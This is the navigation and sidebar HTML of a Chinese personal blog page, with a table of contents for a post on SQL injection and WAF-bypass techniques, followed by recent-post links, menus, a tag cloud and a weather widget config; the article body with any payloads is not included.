toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5"><span class="toc-text">加密解密注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dnslog-%E5%AF%B9%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-text">Dnslog 对外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">中转注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="toc-text">搜索框注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-%E6%B3%A8%E5%85%A5%E5%92%8C-Xff-%E6%B3%A8%E5%85%A5"><span class="toc-text">Cookie 注入和 Xff 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Between-%E6%B3%A8%E5%85%A5"><span class="toc-text">Between 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-%E6%B3%A8%E5%85%A5"><span class="toc-text">limit 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-%E6%B3%A8%E5%85%A5"><span class="toc-text">order by 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-text">绕过空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7"><span class="toc-text">绕过引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="toc-text">绕过逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7"><span class="toc-text">绕过比较符号 ()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Between-%E6%B3%A8%E5%85%A5-1"><span class="toc-text">Between 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#or-and-xor-not-%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">or and xor not 绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-text">绕过注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%AD%89%E4%BA%8E%E5%8F%B7"><span class="toc-text">绕过等于号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-union%EF%BC%8Cselect%EF%BC%8Cwhere-%E7%AD%89%EF%BC%9A"><span class="toc-text">绕过 union，select，where 等：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87-%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-text">WAF 绕过 - 应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99-x2F-%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="toc-text">大小写 &#x2F; 关键字替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81"><span class="toc-text">各种编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E4%BD%BF%E7%94%A8"><span class="toc-text">注释使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%BE%AA%E7%8E%AF"><span class="toc-text">再次循环</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="toc-text">分块传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-text">等价替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E5%8F%8A%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86"><span class="toc-text">编码解码及加密解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%AF%B7%E6%B1%82%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-text">更改请求提交方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6-HPP-HTTP-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-text">中间件 HPP(HTTP 参数污染)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-text">WAF 绕过 - 数据库特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87-%E9%80%BB%E8%BE%91%E5%B1%82"><span class="toc-text">WAF 绕过 - 逻辑层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5-1"><span class="toc-text">普通注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%9B%9E%E6%98%BE%E6%93%8D%E4%BD%9C"><span class="toc-text">全回显操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E4%B8%AA%E7%88%86%E7%A0%B4%EF%BC%9A"><span class="toc-text">(2) 单个爆破：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%A8%E7%88%86%E8%AF%AD%E5%8F%A5"><span class="toc-text">(2) 全爆语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">时间注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XP-CMDSHELL-%E6%A3%80%E6%B5%8B"><span class="toc-text">XP_CMDSHELL 检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF-shell-%E6%96%B9%E6%B3%95"><span class="toc-text">拿 shell 方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-xp-cmdshell-%E6%8B%BF-shell"><span class="toc-text">(1)xp_cmdshell 拿 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E6%8B%BF-shell"><span class="toc-text">(2) 差异备份拿 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5-2"><span class="toc-text">普通注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%9A"><span class="toc-text">有回显：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%9A"><span class="toc-text">无回显：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9B%9E%E6%98%BE%E6%95%B0%E8%BF%9E%E7%BB%AD%EF%BC%89"><span class="toc-text">偏移注入（回显数连续）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5%EF%BC%88%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-text">偏移注入（常规操作）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="toc-text">常规有回显注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-text">第二种常规注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5-1"><span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog-%E6%B3%A8%E5%85%A5"><span class="toc-text">DNSlog 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-text">拓展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlite-%E6%B3%A8%E5%85%A5"><span class="toc-text">Sqlite 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Postsql-%E6%B3%A8%E5%85%A5"><span class="toc-text">Postsql 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-%E6%B3%A8%E5%85%A5"><span class="toc-text">Oracle 注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/%E5%8C%BF%E5%90%8D/%E6%83%85%E4%BA%BA/" title="做情人真的没有好下场吗？"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="做情人真的没有好下场吗？"/></a><div class="content"><a class="title" href="/2023/08/15/%E5%8C%BF%E5%90%8D/%E6%83%85%E4%BA%BA/" title="做情人真的没有好下场吗？">做情人真的没有好下场吗？</a><time datetime="2023-08-14T16:00:00.000Z" title="发表于 2023-08-15 00:00:00">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/30/%E5%8C%BF%E5%90%8D/%E4%B8%8D%E7%88%B1%E6%80%8E%E4%B9%88%E8%B5%B0%E4%B8%8B%E5%8E%BB/" title="不爱前行"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="不爱前行"/></a><div class="content"><a class="title" href="/2023/07/30/%E5%8C%BF%E5%90%8D/%E4%B8%8D%E7%88%B1%E6%80%8E%E4%B9%88%E8%B5%B0%E4%B8%8B%E5%8E%BB/" title="不爱前行">不爱前行</a><time datetime="2023-07-29T16:00:00.000Z" title="发表于 2023-07-30 00:00:00">2023-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/22/%E5%8C%BF%E5%90%8D/%E7%A7%9F%E6%88%BF%E6%97%B6%E5%85%89/" title="租房时光"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="租房时光"/></a><div class="content"><a class="title" href="/2023/07/22/%E5%8C%BF%E5%90%8D/%E7%A7%9F%E6%88%BF%E6%97%B6%E5%85%89/" title="租房时光">租房时光</a><time datetime="2023-07-21T16:00:00.000Z" title="发表于 2023-07-22 00:00:00">2023-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/%E6%97%85%E8%A1%8C/%E6%95%85%E5%AE%AB%E8%AE%B0/" title="故宫记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="故宫记"/></a><div class="content"><a class="title" href="/2023/06/11/%E6%97%85%E8%A1%8C/%E6%95%85%E5%AE%AB%E8%AE%B0/" title="故宫记">故宫记</a><time datetime="2023-06-10T16:00:00.000Z" title="发表于 2023-06-11 00:00:00">2023-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/29/%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%81%93%E9%81%93%E4%B9%8B%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集道道之外网信息收集"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息收集道道之外网信息收集"/></a><div class="content"><a class="title" href="/2023/05/29/%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%81%93%E9%81%93%E4%B9%8B%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集道道之外网信息收集">信息收集道道之外网信息收集</a><time datetime="2023-05-28T16:00:00.000Z" title="发表于 2023-05-29 00:00:00">2023-05-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By <a class="footer-bar-link" href="/" title="Jack hou" target="_blank">Jack hou</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">11</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://www.houyanbin.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=8868465080&amp;server=tencent&amp;type=0"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Article/" style="font-size: 0.88rem; color: rgb(115, 42, 143);">Article<sup>4</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem; color: rgb(11, 162, 98);">CSRF<sup>1</sup></a><a href="/tags/Git/" style="font-size: 0.88rem; color: rgb(99, 102, 101);">Git<sup>1</sup></a><a href="/tags/Java/" style="font-size: 0.88rem; color: rgb(89, 174, 72);">Java<sup>3</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem; color: rgb(165, 134, 55);">JavaScript<sup>17</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem; color: rgb(145, 99, 187);">Linux<sup>1</sup></a><a href="/tags/Pikachu/" style="font-size: 0.88rem; color: rgb(187, 30, 148);">Pikachu<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 0.88rem; color: rgb(30, 128, 29);">SQL<sup>2</sup></a><a href="/tags/XAUUSD/" style="font-size: 0.88rem; color: rgb(33, 146, 124);">XAUUSD<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem; color: rgb(121, 122, 163);">XSS<sup>2</sup></a><a href="/tags/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B/" style="font-size: 0.88rem; color: rgb(27, 15, 129);">《JavaScript权威指南》<sup>17</sup></a><a href="/tags/%E5%8C%BF%E5%90%8D/" style="font-size: 0.88rem; color: rgb(134, 88, 7);">匿名<sup>3</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem; color: rgb(91, 117, 189);">博客<sup>10</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem; color: rgb(194, 12, 109);">安全<sup>20</sup></a><a href="/tags/%E6%94%AF%E4%BB%98/" style="font-size: 0.88rem; color: rgb(55, 6, 45);">支付<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 0.88rem; color: rgb(99, 97, 121);">攻防<sup>1</sup></a><a href="/tags/%E6%97%85%E8%A1%8C/" style="font-size: 0.88rem; color: rgb(197, 198, 13);">旅行<sup>1</sup></a><a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 0.88rem; color: rgb(114, 148, 141);">虚拟机<sup>4</sup></a><a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 0.88rem; color: rgb(46, 94, 153);">越权<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8868465080" server="tencent" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8868465080&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
